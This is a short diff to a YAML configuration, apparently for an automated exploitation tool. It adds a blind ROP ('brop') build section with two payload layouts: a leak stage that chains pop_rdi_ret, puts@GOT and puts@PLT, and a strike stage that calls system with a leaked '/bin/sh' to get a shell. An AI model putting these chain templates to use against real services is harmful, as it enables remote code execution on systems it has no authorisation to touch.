@@ -28,6 +28,22 @@ mcts:
   terminal: false
   success: 0.30
 
+build:
+  technique: brop
+  # the blind ROP: no binary, only a remote oracle that faults. The
+  # measured offset comes from the offset walk (the crash oracle);
+  # the leak stage rides the leak oracle (puts with a controlled rdi),
+  # the strike derives its targets from the leak at runtime.
+  variants:
+    - name: leak_stage
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:pop_rdi_ret", "got_addr:puts", "plt_addr:puts"]
+    - name: strike
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:pop_rdi_ret", "leak:binsh", "leak:system"]
+
 priors: [6, 14]
 
 
